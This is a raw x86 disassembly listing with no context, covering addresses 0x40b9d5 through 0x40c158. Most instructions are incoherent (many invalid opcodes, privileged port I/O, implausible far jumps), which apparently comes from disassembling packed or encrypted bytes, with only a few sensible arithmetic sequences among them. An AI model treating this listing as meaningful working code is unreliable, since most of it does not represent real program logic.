  40b9d5:	out    dx,al
  40b9d6:	sbb    ebp,DWORD PTR [edx-0x7d]
  40b9d9:	pop    ebx
  40b9da:	push   ecx
  40b9db:	in     al,dx
  40b9dc:	ret    0x8944
  40b9df:	xchg   ebx,eax
  40b9e0:	inc    esp
  40b9e1:	int    0xab
  40b9e3:	add    bl,BYTE PTR [edx-0x5]
  40b9e6:	push   esp
  40b9e7:	sbb    eax,0xfb4d6dc5
  40b9ec:	push   ds
  40b9ed:	and    ebx,DWORD PTR [edx]
  40b9ef:	pop    ecx
  40b9f0:	push   0x2b57406a
  40b9f5:	mov    al,ds:0x18f8a0
  40b9fa:	pop    ss
  40b9fb:	or     eax,0xc8c63496
  40ba00:	fbstp  TBYTE PTR [eax]
  40ba02:	inc    ecx
  40ba03:	(bad)  
  40ba04:	xchg   edi,eax
  40ba05:	ret    
  40ba06:	cwde   
  40ba07:	cld    
  40ba08:	sub    ch,BYTE PTR [ebp-0x72b7c38f]
  40ba0e:	iret   
  40ba0f:	xor    esi,esi
  40ba11:	pop    es
  40ba12:	aad    0xaa
  40ba14:	ss inc esp
  40ba16:	push   ebp
  40ba17:	jge    0x40b9ea
  40ba19:	or     ebx,ecx
  40ba1b:	test   DWORD PTR [ecx],ecx
  40ba1d:	mov    ebx,0xcb5b0fc0
  40ba22:	iret   
  40ba23:	mov    eax,0x17ac60c
  40ba28:	jg     0x40b9c0
  40ba2a:	fiadd  WORD PTR [edx]
  40ba2c:	cs and eax,0xa97db453
  40ba32:	popf   
  40ba33:	test   BYTE PTR [ebp+0x120b300e],0xb6
  40ba3a:	adc    BYTE PTR [edi+0x93f92e],cl
  40ba40:	mov    edx,0xddec472f
  40ba45:	add    al,0x94
  40ba47:	das    
  40ba48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba49:	xor    esp,DWORD PTR [ecx+0x47]
  40ba4c:	cmc    
  40ba4d:	pop    esi
  40ba4e:	sbb    al,0x26
  40ba50:	mov    ecx,?
  40ba52:	add    eax,0xae2c2644
  40ba57:	adc    al,BYTE PTR [eax-0xa777671]
  40ba5d:	jecxz  0x40baae
  40ba5f:	ss sub bl,cl
  40ba62:	adc    DWORD PTR [ecx-0x41fe63e1],ecx
  40ba68:	loope  0x40bae5
  40ba6a:	stc    
  40ba6b:	mov    ebx,0xe5833f5d
  40ba70:	ds and al,0x29
  40ba73:	xor    BYTE PTR [eax+0x7f0100f7],bl
  40ba79:	test   BYTE PTR [ebx+0x4512bf8e],al
  40ba7f:	xor    BYTE PTR [edi+0x47594d0e],ah
  40ba85:	push   cs
  40ba86:	add    edx,DWORD PTR ds:0xc234c060
  40ba8c:	jnp    0x40ba66
  40ba8e:	cmp    al,0xb9
  40ba90:	xor    eax,0xbfea3513
  40ba95:	push   ebx
  40ba96:	test   BYTE PTR [ecx+0x19],al
  40ba99:	jnp    0x40ba2c
  40ba9b:	arpl   ax,bx
  40ba9d:	jmp    0xfdf5:0xcac1b6fd
  40baa4:	mov    edx,DWORD PTR [ebp-0x3c]
  40baa7:	mov    edi,DWORD PTR [ebp-0x4]
  40baaa:	xor    edi,eax
  40baac:	xor    edx,eax
  40baae:	add    edi,ecx
  40bab0:	add    edx,ecx
  40bab2:	imul   edx,edi
  40bab5:	mov    DWORD PTR [ebp+0xc],edx
  40bab8:	mov    edx,DWORD PTR [ebp+0xc]
  40babb:	jmp    0x40be2e
  40bac0:	cmp    BYTE PTR ds:0x766dac5b,ch
  40bac6:	retf   
  40bac7:	jge    0x40bac8
  40bac9:	dec    ebx
  40baca:	jo     0x40baa5
  40bacc:	push   0x2a
  40bace:	sub    edx,DWORD PTR [eax+0x7c7c8395]
  40bad4:	retf   0x7c79
  40bad7:	jl     0x40ba7a
  40bad9:	or     DWORD PTR [ebp-0x5e12e5d1],0xffffffbe
  40bae0:	xchg   esi,eax
  40bae1:	sbb    eax,0xb6a62869
  40bae6:	rcl    BYTE PTR [ebp-0x51b5a406],cl
  40baec:	sbb    ah,dl
  40baee:	dec    edi
  40baef:	std    
  40baf0:	adc    al,0x89
  40baf2:	or     cl,BYTE PTR ds:0xe68553c4
  40baf8:	lds    eax,FWORD PTR [ecx]
  40bafa:	cmp    DWORD PTR [esp+edi*1-0x13],esi
  40bafe:	sbb    eax,0x1ea47a94
  40bb03:	cmp    BYTE PTR [eax],al
  40bb05:	sub    al,0xa2
  40bb07:	sbb    BYTE PTR [ecx-0x49],cl
  40bb0a:	jl     0x40bb78
  40bb0c:	test   BYTE PTR [edx],bl
  40bb0e:	add    cl,dl
  40bb10:	mov    dl,0x50
  40bb12:	scas   al,BYTE PTR es:[edi]
  40bb13:	popa   
  40bb14:	retf   0xfe54
  40bb17:	xchg   DWORD PTR [ecx-0x79],ebx
  40bb1a:	repnz scas al,BYTE PTR es:[edi]
  40bb1c:	stos   BYTE PTR es:[edi],al
  40bb1d:	in     al,dx
  40bb1e:	mov    cl,BYTE PTR [edi-0x5253cb80]
  40bb24:	ficomp WORD PTR [edi]
  40bb26:	ins    DWORD PTR es:[edi],dx
  40bb27:	adc    edx,ebx
  40bb29:	push   ebp
  40bb2a:	les    esp,FWORD PTR [eax]
  40bb2c:	(bad)  
  40bb2d:	jl     0x40bb6c
  40bb2f:	mov    eax,ebx
  40bb31:	cmp    ecx,DWORD PTR [edi]
  40bb33:	fimul  WORD PTR [esi-0x22fb571e]
  40bb39:	mov    DWORD PTR [edx-0x5d3d23d1],ecx
  40bb3f:	xor    eax,0xaab55a1f
  40bb44:	ins    DWORD PTR es:[edi],dx
  40bb45:	push   es
  40bb46:	xor    esp,DWORD PTR [ebx+0x1431bddd]
  40bb4c:	lahf   
  40bb4d:	jle    0x40bb63
  40bb4f:	adc    al,0x63
  40bb51:	repnz (bad) 
  40bb54:	ficomp DWORD PTR [esi]
  40bb56:	lahf   
  40bb57:	out    dx,al
  40bb58:	mov    bl,0xf5
  40bb5a:	scas   al,BYTE PTR es:[edi]
  40bb5b:	push   cs
  40bb5c:	dec    edx
  40bb5d:	jmp    0xc1590771
  40bb62:	add    esp,ecx
  40bb64:	dec    ecx
  40bb65:	add    al,0xc9
  40bb67:	push   es
  40bb68:	and    dl,BYTE PTR [esp+ebx*2]
  40bb6b:	cmp    dh,BYTE PTR [ebx]
  40bb6d:	sub    BYTE PTR [edi],dl
  40bb6f:	jb     0x40bbe5
  40bb71:	shl    BYTE PTR [esi-0x1e],0xed
  40bb75:	jns    0x40bb95
  40bb77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb79:	test   BYTE PTR [ecx+eiz*2],0xf1
  40bb7d:	xchg   ebx,eax
  40bb7e:	mov    esp,DWORD PTR [ebp+0x7bfa3334]
  40bb84:	jle    0x40bbd5
  40bb86:	addr16 fwait
  40bb88:	push   ds
  40bb89:	ret    
  40bb8a:	or     ch,BYTE PTR [edi]
  40bb8c:	mov    BYTE PTR [edx+0x105542d9],dh
  40bb92:	(bad)  
  40bb93:	jmp    0x9191:0x5ff98f29
  40bb9a:	call   DWORD PTR [edi]
  40bb9c:	hlt    
  40bb9d:	mov    ch,0xe2
  40bb9f:	loop   0x40bbdf
  40bba1:	or     BYTE PTR [ecx-0x7e],ch
  40bba4:	sub    al,0x2a
  40bba6:	out    dx,eax
  40bba7:	out    dx,al
  40bba8:	popf   
  40bba9:	sbb    al,0x86
  40bbab:	dec    eax
  40bbac:	bound  eax,QWORD PTR [eax]
  40bbae:	cld    
  40bbaf:	push   ss
  40bbb0:	test   BYTE PTR [edx+0x5b],ah
  40bbb3:	in     al,dx
  40bbb4:	jae    0x40bb92
  40bbb6:	fsubp  st(0),st
  40bbb8:	fist   DWORD PTR [edi+0x6fd0338c]
  40bbbe:	int3   
  40bbbf:	int3   
  40bbc0:	pushf  
  40bbc1:	push   0x0
  40bbc3:	cmp    DWORD PTR [esi-0x28bf6587],edx
  40bbc9:	mov    edx,0xaee2090
  40bbce:	stc    
  40bbcf:	jmp    0xd1f2:0x6c0ba40a
  40bbd6:	aas    
  40bbd7:	sbb    al,0x79
  40bbd9:	push   edi
  40bbda:	xor    BYTE PTR [edx-0x6e],ah
  40bbdd:	jg     0x40bb9f
  40bbdf:	xchg   edx,eax
  40bbe0:	mov    ecx,0x428a12c0
  40bbe5:	fwait
  40bbe6:	test   esp,0x6aa9a690
  40bbec:	(bad)  
  40bbed:	jbe    0x40bb72
  40bbef:	sub    al,0xde
  40bbf1:	mov    bl,0x49
  40bbf3:	js     0x40bc13
  40bbf5:	dec    edi
  40bbf6:	(bad)  
  40bbf7:	cld    
  40bbf8:	lea    ebp,[ebx]
  40bbfa:	pop    es
  40bbfb:	aad    0x68
  40bbfd:	fmul   DWORD PTR [esi+0x262a8c15]
  40bc03:	mov    cl,0xa0
  40bc05:	push   ebp
  40bc06:	jle    0x40bbe4
  40bc08:	push   cs
  40bc09:	out    dx,eax
  40bc0a:	stc    
  40bc0b:	adc    edi,esi
  40bc0d:	mov    eax,0xe9819706
  40bc12:	inc    ebp
  40bc13:	div    BYTE PTR [ecx+edx*2]
  40bc16:	or     al,0x41
  40bc18:	mov    gs,WORD PTR [eax-0x2b]
  40bc1b:	data16 test al,0xa3
  40bc1e:	pop    ecx
  40bc1f:	scas   al,BYTE PTR es:[edi]
  40bc20:	push   ecx
  40bc21:	push   ss
  40bc22:	jnp    0x40bbcc
  40bc24:	int3   
  40bc25:	or     BYTE PTR [eax],0xa7
  40bc28:	inc    edx
  40bc29:	dec    esi
  40bc2a:	retf   
  40bc2b:	clc    
  40bc2c:	int    0x81
  40bc2e:	pushw  0xfffb
  40bc31:	jb     0x40bc71
  40bc33:	cmp    al,0x46
  40bc35:	dec    ecx
  40bc36:	out    dx,eax
  40bc37:	inc    ebp
  40bc38:	inc    ebp
  40bc39:	out    dx,al
  40bc3a:	sbb    eax,0x8a5147d7
  40bc3f:	jae    0x40bc69
  40bc41:	dec    esp
  40bc42:	xor    bh,ch
  40bc44:	gs xchg edi,eax
  40bc46:	sbb    al,0x77
  40bc48:	loopne 0x40bbf3
  40bc4a:	push   0xc6c7d014
  40bc4f:	pop    ebx
  40bc50:	cli    
  40bc51:	mov    BYTE PTR [edx+0x77a4328a],ah
  40bc57:	sbb    DWORD PTR cs:[edx],0x60fb520c
  40bc5e:	pop    eax
  40bc5f:	sbb    DWORD PTR gs:[ebp-0x4dc4ed7c],edx
  40bc66:	mov    ss:0x2bd666b5,al
  40bc6c:	cwde   
  40bc6d:	jnp    0x40bc3d
  40bc6f:	mov    dh,0x2e
  40bc71:	xchg   DWORD PTR [edi],edi
  40bc73:	xchg   DWORD PTR [ebp-0x75],edx
  40bc76:	push   edx
  40bc77:	retf   
  40bc78:	inc    ecx
  40bc79:	push   ds
  40bc7a:	test   al,dl
  40bc7c:	xchg   ebp,edx
  40bc7e:	jp     0x40bc4e
  40bc80:	and    dl,ah
  40bc82:	push   esi
  40bc83:	add    esi,DWORD PTR [ebx-0x8]
  40bc86:	rol    BYTE PTR [ecx+0x72],1
  40bc89:	jl     0x40bd05
  40bc8b:	sub    eax,0xf5cb3c78
  40bc90:	std    
  40bc91:	xor    al,0x86
  40bc93:	mov    edx,0x6763dbd0
  40bc98:	(bad)  
  40bc99:	in     al,dx
  40bc9a:	out    dx,al
  40bc9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc9c:	cmp    bl,bl
  40bc9e:	pop    esi
  40bc9f:	jnp    0x40bcac
  40bca1:	int    0x6e
  40bca3:	cmp    al,0x73
  40bca5:	iret   
  40bca6:	jnp    0x40bc69
  40bca8:	mov    ah,0xee
  40bcaa:	xchg   edx,eax
  40bcab:	je     0x40bc32
  40bcad:	push   ebp
  40bcaf:	sbb    ebp,DWORD PTR [edx+0x55]
  40bcb2:	push   edx
  40bcb3:	mov    ds:0x6a5e9d08,al
  40bcb8:	in     eax,0x9e
  40bcba:	(bad)  
  40bcbb:	in     eax,dx
  40bcbc:	out    dx,al
  40bcbd:	test   eax,0xf9e3937
  40bcc2:	and    ebx,ebp
  40bcc4:	imul   ebp,DWORD PTR [ecx],0x7de491a9
  40bcca:	repnz ds stos WORD PTR es:[edi],ax
  40bcce:	inc    esp
  40bccf:	mov    WORD PTR [ebx-0x25],ds
  40bcd2:	xor    BYTE PTR [edx+0x1bd43cbd],bh
  40bcd8:	imul   ebx,ebx,0xffffffcd
  40bcdb:	popa   
  40bcdc:	aad    0x9d
  40bcde:	mov    cl,0xc1
  40bce0:	out    dx,eax
  40bce1:	cld    
  40bce2:	repz add al,0x4d
  40bce5:	cld    
  40bce6:	inc    ecx
  40bce7:	mov    dl,0x5e
  40bce9:	mov    ebx,DWORD PTR [edi+0x6088d01a]
  40bcef:	sub    ah,BYTE PTR [ebp+edi*2-0x1f]
  40bcf3:	mov    ebp,0x92e89a12
  40bcf8:	adc    al,0x35
  40bcfa:	rcr    BYTE PTR [esp+ebp*4],cl
  40bcfd:	(bad)  
  40bcfe:	call   0xa37d:0xacb5bb49
  40bd05:	pop    ebp
  40bd06:	jecxz  0x40bd60
  40bd08:	lahf   
  40bd09:	imul   ebx,esi,0x518ead5b
  40bd0f:	fisubr DWORD PTR [ebp+esi*8+0x13]
  40bd13:	xor    al,0x69
  40bd15:	mov    ch,0x65
  40bd17:	mov    eax,0x8066fe1f
  40bd1c:	aad    0xc0
  40bd1e:	shl    BYTE PTR [eax+0x6a],0x15
  40bd22:	inc    esp
  40bd23:	xor    bl,BYTE PTR [edi+0x430cd117]
  40bd29:	dec    ebx
  40bd2a:	mov    ds:0x31818917,eax
  40bd2f:	or     eax,0xe2713c43
  40bd34:	aas    
  40bd35:	adc    bl,BYTE PTR [ebx-0x3bea089b]
  40bd3b:	sub    al,0x58
  40bd3d:	imul   ebx,DWORD PTR [esi-0x54],0x3f
  40bd41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd42:	rol    DWORD PTR [eax+0x3afd5984],cl
  40bd48:	jle    0x40bd5f
  40bd4a:	ins    DWORD PTR es:[edi],dx
  40bd4b:	add    eax,0x30994d9d
  40bd50:	mov    bh,0x86
  40bd52:	pop    edi
  40bd53:	push   esp
  40bd54:	xchg   edi,eax
  40bd55:	in     eax,0xde
  40bd57:	and    ecx,esp
  40bd59:	mov    al,BYTE PTR [ebp+eax*4+0x4e]
  40bd5d:	pop    esi
  40bd5e:	or     eax,0x4450a09a
  40bd63:	imul   ecx,ecx,0xf7c7b503
  40bd69:	repnz cld 
  40bd6b:	push   esp
  40bd6c:	repnz lds edx,FWORD PTR [eax]
  40bd6f:	sbb    BYTE PTR [ebx-0x6d],dh
  40bd72:	lock nop
  40bd74:	fwait
  40bd75:	inc    edi
  40bd76:	ins    BYTE PTR es:[edi],dx
  40bd77:	sahf   
  40bd78:	popf   
  40bd79:	pop    esp
  40bd7a:	and    ah,dh
  40bd7c:	or     DWORD PTR [ebx-0x7a],esp
  40bd7f:	jno    0x40bd9d
  40bd81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd82:	data16 out 0x28,al
  40bd85:	cmp    al,0x70
  40bd87:	or     eax,0xf4eff1a2
  40bd8c:	sbb    eax,0xb3717a48
  40bd91:	mov    ecx,0xe4f44b43
  40bd96:	outs   dx,DWORD PTR ds:[esi]
  40bd97:	loopne 0x40bd4f
  40bd99:	inc    esp
  40bd9a:	test   al,0xba
  40bd9c:	push   edx
  40bd9d:	and    DWORD PTR ds:0x826e7fde,ebx
  40bda3:	in     eax,0x4e
  40bda5:	cmp    esp,DWORD PTR [ecx+0x34]
  40bda8:	jmp    0xff8b271a
  40bdad:	ret    
  40bdae:	fidiv  WORD PTR [edi+ecx*4]
  40bdb1:	mov    ecx,0x2dbcc362
  40bdb6:	jne    0x40be17
  40bdb8:	(bad)  
  40bdb9:	or     eax,0x5fdaba2d
  40bdbe:	test   eax,0x6cff32a9
  40bdc3:	jmp    0x931:0x23a35ddb
  40bdca:	imul   BYTE PTR [edi-0x5a]
  40bdcd:	jb     0x40be49
  40bdcf:	out    dx,eax
  40bdd0:	cmp    DWORD PTR [esi+edi*8-0x1c6aa54a],0xd988f66d
  40bddb:	in     eax,0x8b
  40bddd:	pop    ecx
  40bdde:	mov    ebx,0xcbb14e9f
  40bde3:	(bad)  
  40bde4:	jbe    0x40bd98
  40bde6:	jmp    0x40be21
  40bde8:	ror    BYTE PTR [edi],cl
  40bdea:	in     eax,0x95
  40bdec:	fisub  DWORD PTR [esi+edx*1-0x33]
  40bdf0:	cmp    eax,0x64cfbb43
  40bdf5:	push   0xf88ba576
  40bdfa:	test   eax,0x1af631aa
  40bdff:	(bad)
  40be03:	mov    esp,0x5ddaf342
  40be08:	out    0x13,eax
  40be0a:	loope  0x40be24
  40be0c:	pop    ds
  40be0d:	xchg   ebp,eax
  40be0e:	ficomp DWORD PTR [ebx+ebx*2]
  40be11:	iret   
  40be12:	jae    0x40be84
  40be14:	mov    ds:0xd908b0e2,eax
  40be19:	pop    ecx
  40be1a:	mov    bl,0x4e
  40be1c:	mov    edx,0x549a8f81
  40be21:	loope  0x40be03
  40be23:	mov    dh,bl
  40be25:	std    
  40be26:	sub    al,0x7d
  40be28:	mov    eax,0xa960d769
  40be2d:	mov    al,0x89
  40be2f:	push   ebp
  40be30:	fmul   QWORD PTR [ebx+0x5503f855]
  40be36:	rol    bh,0x45
  40be39:	call   0xf8dd4373
  40be3e:	mov    DWORD PTR [ebp-0x1c],edx
  40be41:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  40be48:	mov    DWORD PTR [ebp-0x44],0xf89c853b
  40be4f:	mov    edx,DWORD PTR [ebp-0x18]
  40be52:	xor    edx,eax
  40be54:	jmp    0x40c1c7
  40be59:	adc    eax,edx
  40be5b:	mov    bl,0x4c
  40be5d:	jge    0x40bec8
  40be5f:	repz dec ebp
  40be61:	push   ebp
  40be62:	add    ecx,DWORD PTR [ebx+ebx*4]
  40be65:	and    al,0xa2
  40be67:	shl    BYTE PTR [edi+0x63],cl
  40be6a:	mov    WORD PTR [esp+edi*2-0x36],?
  40be6e:	jns    0x40beec
  40be70:	jl     0x40bea9
  40be72:	add    ebx,DWORD PTR [ebp-0xb81045b]
  40be78:	aad    0xb9
  40be7a:	sub    ch,BYTE PTR [edx+esi*2-0x36]
  40be7e:	out    dx,eax
  40be7f:	int    0xa8
  40be81:	mov    esi,0xc7d52b28
  40be86:	test   DWORD PTR [edx-0x41],ebx
  40be89:	mov    bh,0x29
  40be8b:	xor    eax,0x324bc989
  40be90:	stos   DWORD PTR es:[edi],eax
  40be91:	leave  
  40be92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be93:	jne    0x40be37
  40be95:	sub    BYTE PTR [edx+0x53],bh
  40be98:	push   cs
  40be99:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40be9b:	dec    ecx
  40be9c:	xchg   edi,eax
  40be9d:	aaa    
  40be9e:	in     eax,0x2b
  40bea0:	leave  
  40bea1:	adc    edi,ebx
  40bea3:	sub    ch,BYTE PTR [eax+0x34]
  40bea6:	dec    ebx
  40bea7:	or     edx,edx
  40bea9:	jecxz  0x40be6f
  40beab:	push   0xda3a17fb
  40beb0:	or     DWORD PTR [edi+edi*2],edx
  40beb3:	sub    al,cl
  40beb5:	xchg   BYTE PTR [esi-0x57],ch
  40beb8:	inc    esp
  40beb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beba:	outs   dx,BYTE PTR ds:[esi]
  40bebb:	push   es
  40bebc:	scas   eax,DWORD PTR es:[edi]
  40bebd:	out    dx,al
  40bebe:	push   ebx
  40bebf:	imul   edi,DWORD PTR [edi],0x51cd0743
  40bec5:	or     BYTE PTR [esp+edx*8],al
  40bec8:	mov    dh,0xe0
  40beca:	mul    DWORD PTR [edi+0x2ee02a7d]
  40bed0:	mov    bh,0xb1
  40bed2:	xchg   ebx,eax
  40bed3:	jo     0x40be7a
  40bed5:	push   cs
  40bed6:	add    ebp,DWORD PTR [edi-0x79]
  40bed9:	nop
  40beda:	add    BYTE PTR [edx+ecx*4-0x1a],dh
  40bede:	pop    ebx
  40bedf:	add    edx,DWORD PTR es:[ecx+0x294e36a0]
  40bee6:	in     al,dx
  40bee7:	pop    ebx
  40bee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bee9:	test   eax,0xe237fd14
  40beee:	push   esi
  40beef:	jnp    0x40bf2e
  40bef1:	mov    dh,0x4b
  40bef3:	stos   BYTE PTR es:[edi],al
  40bef4:	push   edx
  40bef5:	mov    WORD PTR [ebp+0x1b],ds
  40bef8:	jge    0x44eaacbb
  40befe:	mov    ebp,0xb90d10f9
  40bf03:	push   ss
  40bf04:	fadd   QWORD PTR [edx+ebx*1-0x37]
  40bf08:	scas   al,BYTE PTR es:[edi]
  40bf09:	into   
  40bf0a:	icebp  
  40bf0b:	or     eax,0xe7673a40
  40bf10:	cs inc ebp
  40bf12:	and    bh,BYTE PTR [esi]
  40bf14:	fld    TBYTE PTR ds:0xca3d318d
  40bf1a:	pop    esp
  40bf1b:	mov    ch,0xf8
  40bf1d:	and    eax,edx
  40bf1f:	or     al,ch
  40bf21:	(bad)
  40bf25:	stc    
  40bf26:	inc    ecx
  40bf27:	jmp    0xe29b:0x3a4d5e20
  40bf2e:	les    edi,FWORD PTR [ebp+0xe]
  40bf31:	dec    edi
  40bf32:	test   eax,0x62163489
  40bf37:	xor    ah,al
  40bf39:	pop    ecx
  40bf3a:	push   ebp
  40bf3b:	loopne 0x40bf6c
  40bf3d:	push   ss
  40bf3e:	test   eax,0x21dcede4
  40bf43:	out    0xa4,eax
  40bf45:	mov    ebx,0xc46f339
  40bf4a:	mov    edi,0xf9863877
  40bf4f:	mov    al,ds:0xe2a951de
  40bf54:	(bad)  
  40bf55:	adc    ecx,DWORD PTR [ecx+0x6926ef9c]
  40bf5b:	adc    esi,edi
  40bf5d:	mov    al,0xd2
  40bf5f:	(bad)  
  40bf60:	mov    ds:0x27d3e0f3,al
  40bf65:	push   ebx
  40bf66:	jae    0x40bf90
  40bf68:	and    eax,0x86a4a10f
  40bf6d:	add    al,0xd
  40bf6f:	into   
  40bf70:	mov    ah,BYTE PTR [edi]
  40bf72:	or     al,0xf1
  40bf74:	push   ebx
  40bf75:	js     0x40bf1e
  40bf77:	outs   dx,DWORD PTR ds:[esi]
  40bf78:	add    eax,0x94050b61
  40bf7d:	sbb    DWORD PTR [ebp+edx*4+0x4aa2c8b4],ebx
  40bf84:	jno    0x40bf6f
  40bf86:	loope  0x40c000
  40bf88:	fwait
  40bf89:	in     al,0xb6
  40bf8b:	mov    eax,0xf407dfee
  40bf90:	(bad)  
  40bf91:	div    ecx
  40bf93:	frstor [esi-0x6a5be99b]
  40bf99:	data16 jp 0x40bf26
  40bf9c:	shl    dl,cl
  40bf9e:	sbb    cl,bh
  40bfa0:	nop
  40bfa1:	icebp  
  40bfa2:	jl     0x40bf35
  40bfa4:	xchg   esp,eax
  40bfa5:	(bad)  
  40bfa6:	inc    edi
  40bfa7:	inc    esi
  40bfa8:	loope  0x40bf8f
  40bfaa:	push   ebp
  40bfab:	gs jecxz 0x40bf88
  40bfae:	xchg   edx,eax
  40bfaf:	dec    ebp
  40bfb0:	popa   
  40bfb1:	ficom  WORD PTR [ecx-0x2c859b1f]
  40bfb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bfb8:	shl    ch,cl
  40bfba:	jnp    0x40c006
  40bfbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfbe:	adc    ebp,DWORD PTR [esi+0xd8bd7be]
  40bfc4:	test   BYTE PTR [edi-0x49e0b43a],bl
  40bfca:	je     0x40bf5f
  40bfcc:	into   
  40bfcd:	sbb    eax,0xc559de3c
  40bfd2:	pop    ss
  40bfd3:	daa    
  40bfd4:	jmp    0x40c045
  40bfd6:	test   eax,0x59947098
  40bfdb:	fldcw  WORD PTR [edi]
  40bfdd:	retf   
  40bfde:	inc    eax
  40bfdf:	pop    ds
  40bfe0:	mov    eax,DWORD PTR [ecx]
  40bfe2:	out    0x85,eax
  40bfe4:	dec    esi
  40bfe5:	pop    eax
  40bfe6:	inc    edx
  40bfe7:	jno    0x40c004
  40bfe9:	aad    0x94
  40bfeb:	jecxz  0x40c040
  40bfed:	pop    esp
  40bfee:	loop   0x40c05e
  40bff0:	adc    eax,0xdfbe3ef1
  40bff5:	in     eax,dx
  40bff6:	enter  0xf16c,0xef
  40bffa:	push   esp
  40bffb:	call   0x347d:0xf420bc9b
  40c002:	push   esi
  40c003:	mov    ch,0xe7
  40c005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c006:	(bad)  
  40c009:	stos   BYTE PTR es:[edi],al
  40c00a:	mov    ecx,0x7cc95e58
  40c00f:	popa   
  40c010:	or     eax,0x109cfd9f
  40c015:	mov    ah,0x2d
  40c017:	jp     0x40c01f
  40c019:	add    eax,0xceab7287
  40c01e:	aas    
  40c01f:	cmp    eax,0x269e694e
  40c024:	add    al,0xe9
  40c026:	mov    ?,WORD PTR [ebx+0x47a1f3c8]
  40c02c:	push   es
  40c02d:	and    ecx,ecx
  40c02f:	ret    0xd27
  40c032:	xchg   esp,eax
  40c033:	in     eax,0xde
  40c035:	mov    esp,0xe1921190
  40c03a:	inc    ebp
  40c03b:	and    cl,BYTE PTR [ebx+0x3b77f4ca]
  40c041:	push   esp
  40c042:	jno    0x40c0c1
  40c044:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c045:	mov    edi,0xa18bac53
  40c04a:	inc    eax
  40c04b:	iret   
  40c04c:	mov    ch,bl
  40c04e:	sub    edi,esp
  40c050:	leave  
  40c051:	lods   al,BYTE PTR ds:[esi]
  40c052:	push   ds
  40c053:	jg     0x40bfe8
  40c055:	adc    BYTE PTR [esi-0x4c],0xe9
  40c059:	pushf  
  40c05a:	div    cl
  40c05c:	in     al,dx
  40c05d:	mov    DWORD PTR [edi+0x71d23330],ebp
  40c063:	lods   eax,DWORD PTR ds:[esi]
  40c064:	sub    BYTE PTR [eax+eiz*1-0x2463ebb6],bl
  40c06b:	xchg   ecx,eax
  40c06c:	(bad)  
  40c06d:	sbb    eax,ecx
  40c06f:	push   ebp
  40c070:	mov    eax,0x456500a
  40c075:	stos   BYTE PTR es:[edi],al
  40c076:	inc    esp
  40c077:	mov    ch,0xc1
  40c079:	retf   0x18c1
  40c07c:	call   0xa1d7:0x3c8760b9
  40c083:	cs (bad) 
  40c085:	pop    edx
  40c086:	pop    esp
  40c087:	nop
  40c088:	and    al,0xb
  40c08a:	sub    al,0x11
  40c08c:	gs int 0x3b
  40c08f:	and    eax,0x4e2c1926
  40c094:	scas   eax,DWORD PTR es:[edi]
  40c095:	sub    eax,0x98679d80
  40c09a:	and    ch,BYTE PTR [esi+0x23]
  40c09d:	xor    BYTE PTR [ebx-0x77f31a4d],bl
  40c0a3:	push   eax
  40c0a4:	ja     0x40c050
  40c0a6:	add    al,0x5
  40c0a8:	or     DWORD PTR [ecx],ebx
  40c0aa:	sub    ebx,DWORD PTR [ebx-0x2e]
  40c0ad:	add    ecx,DWORD PTR [ecx+0x74739c2f]
  40c0b3:	shl    DWORD PTR [edx+eax*2],cl
  40c0b6:	neg    DWORD PTR [eax-0x50]
  40c0b9:	push   cs
  40c0ba:	mov    esi,0xc8139f12
  40c0bf:	jl     0x40c0a8
  40c0c1:	out    0xbf,al
  40c0c3:	mov    dl,0xcb
  40c0c5:	dec    ebx
  40c0c6:	add    eax,0x58f88781
  40c0cb:	imul   esi,esp,0xffffffad
  40c0ce:	test   BYTE PTR [ebp+0x3fd833e1],dl
  40c0d4:	leave  
  40c0d5:	popa   
  40c0d6:	mov    DWORD PTR [edi+eax*2-0x592235ea],0xecb8726a
  40c0e1:	or     al,0xb0
  40c0e3:	dec    esi
  40c0e4:	mov    al,0x3c
  40c0e6:	fsubr  DWORD PTR [ecx+0x20146711]
  40c0ec:	xor    edx,edi
  40c0ee:	push   ebp
  40c0ef:	xchg   ebx,eax
  40c0f0:	sub    al,0x4c
  40c0f2:	pushf  
  40c0f3:	test   al,0x0
  40c0f5:	jo     0x40c07f
  40c0f7:	inc    eax
  40c0f8:	add    al,0x18
  40c0fa:	mov    eax,ds:0xc014d465
  40c0ff:	inc    ebp
  40c100:	adc    BYTE PTR [edi+esi*8],al
  40c103:	retf   
  40c104:	lods   eax,DWORD PTR ds:[esi]
  40c105:	shl    DWORD PTR [ebp+0x4cae467d],0x40
  40c10c:	rol    DWORD PTR [esi-0x37],cl
  40c10f:	outs   dx,BYTE PTR ds:[esi]
  40c110:	inc    ebp
  40c111:	xor    ch,ch
  40c113:	aad    0x8
  40c115:	fild   QWORD PTR [edi+0x39d2a4e]
  40c11b:	xor    ebp,DWORD PTR [edx+0x5c]
  40c11e:	lahf   
  40c11f:	cmc    
  40c120:	sar    DWORD PTR [ecx],0x45
  40c123:	xchg   esp,eax
  40c124:	pusha  
  40c125:	out    0x66,eax
  40c127:	fwait
  40c128:	in     eax,0x3e
  40c12a:	sub    DWORD PTR [esp+ebp*1-0x5ef49f92],edx
  40c131:	retf   0x536f
  40c134:	pop    ds
  40c135:	fsubr  DWORD PTR [bx+si]
  40c138:	push   0x5cae8153
  40c13d:	dec    si
  40c13f:	jle    0x40c1bc
  40c141:	xor    edi,DWORD PTR [esi]
  40c143:	sbb    BYTE PTR [ebp-0x73e87064],0x78
  40c14a:	push   0x5bb43d72
  40c14f:	clc    
  40c150:	shr    DWORD PTR [esi],1
  40c152:	mov    ?,WORD PTR [ecx+ebx*1-0x6c]
  40c156:	sahf   
  40c157:	inc    esp
  40c158:	enter  0x4f35,0xcb
